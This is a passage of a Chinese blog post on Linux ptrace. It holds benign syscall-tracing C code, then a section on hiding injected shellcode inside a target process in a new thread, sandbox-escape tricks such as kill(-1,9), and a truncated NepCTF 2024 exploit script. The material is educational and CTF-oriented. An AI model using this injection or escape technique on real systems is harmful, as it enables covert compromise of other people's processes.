class="number">17</span>:<span class="number">27</span> vuln</span><br><span class="line">Origen signal <span class="number">1407</span> !Got signal <span class="number">5</span></span><br><span class="line">Program called system call: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>我们结合控制台输出来解释下程序当时的行为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Program called system call: <span class="number">1</span>：程序开始调用write系统调用，准备向控制台写入数据；</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">1.9</span>K <span class="number">8</span>月 <span class="number">28</span> <span class="number">17</span>:<span class="number">00</span> monitor_signal.c：程序写入数据；</span><br><span class="line">Program called system call: <span class="number">1</span>：程序退出write系统调用。</span><br></pre></td></tr></table></figure><h5 id="1-6-3-4-2-优化代码"><a href="#1-6-3-4-2-优化代码" class="headerlink" title="1.6.3.4.2 优化代码"></a>1.6.3.4.2 优化代码</h5><p>所以我们也可以充分利用PTRACE_SYSCALL的特性，将程序开始进行系统调用和结束系统调用的相关信息打印出来？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/reg.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">long orig_rax;</span><br><span class="line">pid_t child=fork();</span><br><span class="line">    <span class="built_in">int</span> status=<span class="number">0</span>;</span><br><span class="line">    long rax=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> insyscall=<span class="number">0</span>;</span><br><span class="line">    long params[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,NULL,NULL);</span><br><span class="line">        execl(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            orig_rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,NULL);</span><br><span class="line">            <span class="keyword">if</span>(orig_rax != SYS_write)&#123;</span><br><span class="line">ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(<span class="string">&quot;Got signal %d\n&quot;</span>,WSTOPSIG(status));</span><br><span class="line">/*Syscall entry*/</span><br><span class="line"><span class="keyword">if</span>(insyscall==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">insyscall=<span class="number">1</span>;</span><br><span class="line">params[<span class="number">0</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDI,NULL);</span><br><span class="line">params[<span class="number">1</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RSI,NULL);</span><br><span class="line">params[<span class="number">2</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDX,NULL);</span><br><span class="line">printf(<span class="string">&quot;write called with %ld,%ld,%ld\n&quot;</span>,params[<span class="number">0</span>],params[<span class="number">1</span>],params[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">params[<span class="number">0</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RAX,NULL);</span><br><span class="line">printf(<span class="string">&quot;Write returned with %ld\n&quot;</span>,rax);</span><br><span class="line">insyscall=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, NULL, NULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相比之前的代码，这份代码有两部分的优化，第一个过滤掉除write的系统调用，第二个显示write系统调用的参数和返回值。</p><p>只捕抓write系统调用的实现：过滤掉第一个execve的系统调用之后，再次等待子进程的信号,syscall会向父进程发送信号，可以用PEEKUSER获取的rax值（其作为系统调用号）。</p><p>分别处理系统调用的进入和退出：系统调用是成对出现的。因此捕抓到write系统调用的时候，我们通过一个insyscall变量来表示这个系统调用是“进入”状态还是“退出”状态。</p><p>显示<code>write</code>系统调用入参情况：我们可以从<code>ORIG_RAX</code>这个寄存器中获取系统调用号，通过同样的方式，我们可以通过<code>RDI</code>、<code>RSI</code>和<code>RDX</code>寄存器分别获取系统调用的第1、2、3个参数。</p><p>实际上，Linux为64位机器提供了6个保存参数的寄存器，按照顺序他们分别是：RDI、RSI、RDX、RCX、R8和R9。</p><p>显示<code>write</code>系统调用返回值：当<code>insyscall</code>变量为<code>1</code>时，说明程序已经进入系统调用，接下来的一次系统调用行为就是退出系统调用。这时，我们通过获取<code>RAX</code>寄存器中的值，可以获取系统调用的返回值。</p><p><code>ORIG_RAX</code>寄存器保存系统调用号，<code>RAX</code>寄存器保存系统调用返回值。</p><h5 id="1-6-3-4-3-为什么子进程信号一直是5）SIGTRAP"><a href="#1-6-3-4-3-为什么子进程信号一直是5）SIGTRAP" class="headerlink" title="1.6.3.4.3 为什么子进程信号一直是5）SIGTRAP"></a>1.6.3.4.3 为什么子进程信号一直是5）SIGTRAP</h5><p>在入门版本的输出中，输出的<code>Got signal</code>内容一直都是<code>5</code>这个信号，也就是<code>SIGTRAP</code>。</p><p>这个型号只能告诉tracer进程：tracee进程现在处于中止状态，等待tracer进程对其进行控制，而并不能告诉tracer进程到底是什么原因导致tracee进程进入中止状态的。</p><p>ptrace系统调用我们提供了判别方式：通过PTRACE_SETOPTIONS操作传递PTRACE_0_TRACESYSGOOD给tracee进程，从而让tracee进程发送给tracer进程的信号编号（signal code）由5也就是SIGTRAP 编程5|0x80，也就是133.</p><p>如果返回值是133，那么其就属于系统调用发出的信号。</p><p>0x80是操作系统规定属于系统调用的中断号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/reg.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">pid_t child=fork();</span><br><span class="line">long orig_rax=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> status=<span class="number">0</span>;</span><br><span class="line">    long rax=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> insyscall=<span class="number">0</span>;</span><br><span class="line">    long params[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,NULL,NULL);</span><br><span class="line">        execl(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    ptrace(PTRACE_SETOPTIONS, child, <span class="number">0</span>, PTRACE_O_TRACESYSGOOD);</span><br><span class="line">    ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line">    //puts(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            //puts(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (! (WSTOPSIG(status) &amp; <span class="number">0x80</span>)) </span><br><span class="line">            &#123;</span><br><span class="line">ptrace(PTRACE_SYSCALL, child, NULL, NULL);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">            orig_rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,NULL);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(orig_rax != <span class="number">1</span>)&#123;</span><br><span class="line">ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(<span class="string">&quot;Got signal %d\n&quot;</span>,WSTOPSIG(status));</span><br><span class="line">/*Syscall entry*/</span><br><span class="line"><span class="keyword">if</span>(insyscall==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">insyscall=<span class="number">1</span>;</span><br><span class="line">params[<span class="number">0</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDI,NULL);</span><br><span class="line">params[<span class="number">1</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RSI,NULL);</span><br><span class="line">params[<span class="number">2</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDX,NULL);</span><br><span class="line">printf(<span class="string">&quot;write called with %ld,%ld,%ld\n&quot;</span>,params[<span class="number">0</span>],params[<span class="number">1</span>],params[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RAX,NULL);</span><br><span class="line">printf(<span class="string">&quot;Write returned with %ld\n&quot;</span>,rax);</span><br><span class="line">insyscall=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, NULL, NULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果，这里只放出一部分代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Got signal <span class="number">133</span></span><br><span class="line">write called <span class="keyword">with</span> <span class="number">1</span>,<span class="number">95611630020928</span>,<span class="number">10</span></span><br><span class="line">total 64K</span><br><span class="line">Got signal <span class="number">133</span></span><br><span class="line">Write returned <span class="keyword">with</span> <span class="number">10</span></span><br><span class="line">Got signal <span class="number">133</span></span><br><span class="line">write called <span class="keyword">with</span> <span class="number">1</span>,<span class="number">95611630020928</span>,<span class="number">46</span></span><br><span class="line">drwxrwxr-x  <span class="number">4</span> qwq qwq <span class="number">4.0</span>K  <span class="number">3</span>月  <span class="number">1</span>  <span class="number">2024</span> buu</span><br><span class="line">Got signal <span class="number">133</span></span><br><span class="line">Write returned <span class="keyword">with</span> <span class="number">46</span></span><br></pre></td></tr></table></figure><h2 id="1-7-进程栈与进程堆-线程栈和线程堆"><a href="#1-7-进程栈与进程堆-线程栈和线程堆" class="headerlink" title="1.7 进程栈与进程堆 线程栈和线程堆"></a>1.7 进程栈与进程堆 线程栈和线程堆</h2><p>前面我们提到了进程的四要素</p><ol><li>要执行的程序</li><li>专用的系统堆栈空间（代码段数据段等）</li><li>task_struct和pid</li><li>独立的存储空间</li></ol><p>  缺少第四条的称为线程，如果完全没有用户空间称为内核线程，共享用户空间的称为用户线</p><p>接下来我们来了解进程栈和线程栈</p><hr><p><strong>进程栈</strong>：<strong>程序被操作系统加载并执行时，会为其分配一块内存作为进程的地址空间，这其中包括进程栈。</strong>进程栈存储所有线程共享的全局变量之外等等数据。比如局部变量，函数参数和返回地址。每个进程是独立的，所以进程栈也是相互独立的。</p><p><strong>线程栈：每个线程共享所属进程的地址空间，但是有自己的线程栈</strong>。线程栈同样存储局部变量，函数参数和返回地址。它们是线程私有的，每个线程的栈空间互不影响。</p><p><strong>进程栈服务于整个进程，而线程栈服务于进程内的每一个线程。</strong></p><h1 id="0X2-ptrace的shellcode注入"><a href="#0X2-ptrace的shellcode注入" class="headerlink" title="0X2 ptrace的shellcode注入"></a>0X2 ptrace的shellcode注入</h1><h2 id="2-1-相关原理"><a href="#2-1-相关原理" class="headerlink" title="2.1 相关原理"></a>2.1 相关原理</h2><p>参考：<a href="https://www.freebuf.com/articles/system/350514.html">一种Linux下ptrace隐藏注入shellcode技术和防御方法 - FreeBuf网络安全行业门户</a></p><p>不同版本操作系统有各自实现ptrace系统调用的方式，由于本文只关注Linux环境。我们通常用ptrace提供的系统调用 通过一个进程去控制另一个进程，这常被用于程序调试、分析和监测工具，例如gdb和strace等。</p><p>控制进程tracer和被控制进程tracee</p><p>一个tracee只能关联（attach）一个tracer，一个tracer可以关联多个tracee，实际上linux下tracee只是一个线程，一个包含多个线程的进程中每个线程可以单独关联各自的tracer。</p><p>如果tracer要控制tracee可以进行下图的对应操作。</p><p><img src="E:\blog_images\1726049231841-1a5c4bdc-96e3-4ed7-9886-a2bdb6dc14b6.jpeg" alt="img"></p><ol><li>tracer调用PTRACE_ATTACH功能关联指定的tracee，向tracee发送SIGSTOP信号，并调用waitpid等待tracee状态改变；</li><li>当tracee状态变成STOP，waitpid返回；</li><li>tracer调用PTRACE_SYSCALL功能让tracee进入单步执行状态，并调用waitpid等待tracee状态改变；</li><li>重复步骤2)和步骤3)；</li><li>tracer调用PTRACE_DETACH功能让tracee恢复运行，并解除关联。</li></ol><p>步骤3)中tracer可以检查和修改tracee的内存和寄存器内容，给渗透攻击注入shellcode提供了可能，接下来描述利用ptrace隐藏注入shellcode的技术细节。</p><h2 id="2-2-技术解析"><a href="#2-2-技术解析" class="headerlink" title="2.2 技术解析"></a>2.2 技术解析</h2><p>达成隐藏注入shellcode的目标需要解决三个问题：</p><ol><li>shellcode存放在哪里？</li><li>如何执行shellcode？</li><li>如何不被轻易发现正在运行的shellcode？</li></ol><h3 id="2-2-1-shellcode存放在哪里"><a href="#2-2-1-shellcode存放在哪里" class="headerlink" title="2.2.1 shellcode存放在哪里"></a>2.2.1 shellcode存放在哪里</h3><p>shellcode存放涉及到读取和写入的问题，而且存放的段还要有可执行权限（即具有rwxp权限的段），所以一般存放在mmap分配出来的内存。</p><p>所以要实现shellcode存放，父进程函数执行流得如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_ATTACH,tracee_pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">waitpid(tracee_pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">mem_addr=remote_mmap(tracee_pid,<span class="literal">NULL</span>,<span class="number">4096</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">poke_text(tracee_pid,(<span class="type">size_t</span>)mem_addr,shellcode,SHELL_LEN);</span><br></pre></td></tr></table></figure><p>如何在子进程的内存中写入shellcode？自己的猜想</p><p>第一 子进程和父进程共享内存，那么我们可以在父进程先写入shellcode</p><p>第二 不共享内存，则有没有修改子进程内存的函数或者文件？</p><p>文件的话&#x2F;proc&#x2F;pid&#x2F;mem可以修改内存</p><h3 id="2-2-2-如何执行shellcode"><a href="#2-2-2-如何执行shellcode" class="headerlink" title="2.2.2 如何执行shellcode"></a>2.2.2 如何执行shellcode</h3><p>我们控制的是父进程的函数执行流，对于子进程我们需要通过父进程修改rip寄存器来达到修改shellcode的效果。伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取tracee寄存器并备份</span></span><br><span class="line"><span class="comment">//reg是struct user_regs_struct类型变量，上面有提到过</span></span><br><span class="line">ptrace(PTRACE_GETREGS,tracee_pid,<span class="literal">NULL</span>,&amp;reg);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;old_regs,&amp;regs,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_regs_struct));</span><br><span class="line"><span class="comment">//修改rip为mem_addr (shellcode的地址)</span></span><br><span class="line">regs.rip = (<span class="type">u_int64_t</span>) mem_addr;</span><br><span class="line">regs.rip += <span class="number">2</span>;<span class="comment">//+=2的意义何在？</span></span><br><span class="line"><span class="comment">//设置tracee寄存器</span></span><br><span class="line">ptrace(PTRACE_SETREGS, tracee_pid, <span class="literal">NULL</span>, &amp;regs)</span><br><span class="line"><span class="comment">//执行shellcode，假设shellcode结尾执行了getpid系统调用，就是用它结尾的意思</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  ptrace(PTRACE_SYSCALL, tracee_pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br><span class="line">  waitpid(tracee_pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">  ptrace(PTRACE_GETREGS, tracee_pid, <span class="number">0</span>, &amp;regs)</span><br><span class="line">  <span class="keyword">if</span> (regs.orig_rax == <span class="number">39</span>) &#123;</span><br><span class="line">    <span class="comment">// 已执行getpid系统调用，恢复tracee状态</span></span><br><span class="line">    ptrace(PTRACE_SETREGS, tracee_pid, <span class="literal">NULL</span>, &amp;old_regs)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 恢复tracee运行</span></span><br><span class="line">ptrace(PTRACE_DETACH, tracee_pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><p>但是上述代码只是在tracee进程（线程）中执行了一次shellcode，还达不到隐藏注入的目的。</p><h3 id="2-2-3-隐藏shellcode执行"><a href="#2-2-3-隐藏shellcode执行" class="headerlink" title="2.2.3 隐藏shellcode执行"></a>2.2.3 隐藏shellcode执行</h3><p>一个简单的解决方法是在tracee所在进程中新建一个线程，在新建的线程中执行shellcode，并在shellcode中加入可以持续运行的循环。（如何理解？）</p><p>这时，通过监测进程状态难以发现注入的shellcode；如果tracee所在进程原来就包含多个线程，通过监测线程状态也难以准确判断是否被注入了shellcode；虽然检查tracee进程的内存段可以找到具有执行权限的匿名内存段，但是有些进程本来就存在具有执行权限的匿名内存段，仍然不能准确判断是否存在shellcode。综上所述，这种新建线程中执行shellcode的方式能够解决第三个问题：如何不被轻易发现正在运行的shellcode。伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置新建线程的栈</span></span><br><span class="line">stack_addr = remote_mmap(tracee_pid, <span class="literal">NULL</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>)</span><br><span class="line">stack_top = stack_addr + <span class="number">4096</span></span><br><span class="line">poke_text(tracee_pid, (<span class="type">size_t</span>)stack_addr, (<span class="type">char</span> *)&amp;mem_addr, <span class="keyword">sizeof</span>(<span class="type">void</span> *))</span><br><span class="line"><span class="comment">// 修改系统调用为SYS_clone并单步执行，新建线程以后恢复执行原有代码</span></span><br><span class="line">thread_pid = remote_clone(pid, CLONE_PTRACE | CLONE_SIGHAND | CLONE_THREAD | CLONE_VM | CLONE_FS | CLONE_FILES, stack_top)</span><br><span class="line"><span class="comment">// 在新建的线程中执行shellcode</span></span><br><span class="line">ptrace(PTRACE_GETREGS, thread_pid, <span class="literal">NULL</span>, &amp;regs)</span><br><span class="line">regs.rip = (<span class="type">u_int64_t</span>) mem_addr;</span><br><span class="line">ptrace(PTRACE_SETREGS, thread_pid, <span class="literal">NULL</span>, &amp;regs)</span><br><span class="line">ptrace(PTRACE_DETACH, thread_pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><h2 id="2-3-对应的防御措施"><a href="#2-3-对应的防御措施" class="headerlink" title="2.3 对应的防御措施"></a>2.3 对应的防御措施</h2><p>Linux内核使用图4描述的算法检查调用者（caller）相对目标（target）的ptrace访问权限。首先检查调用者和目标是否在同一个线程组，是则允许（allowed）使用ptrace功能；接着根据调用者和目标的用户编号（uid）和组编号（gid）是否一致、目标是否有可转存（dumpable）属性、调用方是否具有CAP_SYS_PTRACE权限，判定是否拒绝（denied）使用ptrace功能；然后调用Linux安全模块（LSM），例如：SELinux、Yama、Smack等，不同的安全模块有各自的检查判定规则；最后如果之前的检查没有拒绝使用ptrace功能，则允许使用。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726108227781-e82be599-1ad7-4755-839b-734eb69d8d50.jpeg" alt="img"></p><h2 id="2-4-能够进行的绕过"><a href="#2-4-能够进行的绕过" class="headerlink" title="2.4 能够进行的绕过"></a>2.4 能够进行的绕过</h2><p>参考：<a href="https://qianfei11.github.io/MyOldBlog/2020/04/18/Linux-Sandbox-Ptrace/#Escape-by-Fork">Linux Sandbox - Ptrace - B3ale (qianfei11.github.io)</a></p><h3 id="2-4-1-Escape-by-fork"><a href="#2-4-1-Escape-by-fork" class="headerlink" title="2.4.1 Escape by fork"></a>2.4.1 Escape by fork</h3><ul><li><p>只要 ptrace 没有跟踪好 fork、vfork、clone，子进程就不会被 ptrace 跟踪；</p></li><li><p>正确的做法是要继续跟好子进程，或者直接禁止 fork。</p></li><li><ul><li>可以设置 <code>PTRACE_O_TRACECLONE</code> 选项，会自动跟踪 clone 出来的新进程。</li></ul></li></ul><h3 id="2-4-2-Escape-by-Kill"><a href="#2-4-2-Escape-by-Kill" class="headerlink" title="2.4.2 Escape by Kill"></a>2.4.2 Escape by Kill</h3><ul><li><p>杀死父进程；</p></li><li><ul><li><code>kill(getppid(), 9);</code>；</li><li>ppid 无法获取时可以尝试 pid-1；</li><li><code>/proc/self/stat</code> 中可以拿到 pid 和 ppid；</li><li><code>kill(-1, 9);</code> 杀死除了自己以外的所有进程。</li></ul></li><li><p>设置 <code>PTRACE_O_EXITKILL</code> 可以让 Tracer 结束时把所有的 Tracee 杀死。</p></li></ul><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>fork ptrace wait函数这些进程相关的函数</p><p>这里考点比较零碎，主要考基础知识，基础知识得自己去查去学</p><p>如fork爆破canary等</p><p>wait等的是ptrace的状态，所以我们可以用空的ptrace调用绕过wait的状态检查</p><p>例题就是2024nepctf</p><h2 id="2024nepctf-NepBOX"><a href="#2024nepctf-NepBOX" class="headerlink" title="2024nepctf NepBOX"></a>2024nepctf NepBOX</h2><p>自制沙盒，好像考点也不难。</p><p>主要是看沙盒给了什么函数，从上面的函数下手就可以了。</p><p>后面想到wait出来的参数是根据ptrace来的，只要我提前ptrace一个空进程，就能绕过很多东西wait状态的检查，只能说学到了很多进程的东西。</p><p>然后虽然说没有read函数的功能，但是题目给出了一个打印read函数参数的功能，就利用这个功能区leak。</p><p>要注意rsi为rsp才能leak上面的内容，因为指针的关系，这里%p只是打印寄存器的值，然而pop rsi，自然打印出来rsp上面的值.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;neptune-49685.nepctf.lemonprefect.cn&#x27;</span>,<span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="literal">True</span>, typ=<span class="string">&quot;tcp&quot;</span>)</span><br><span 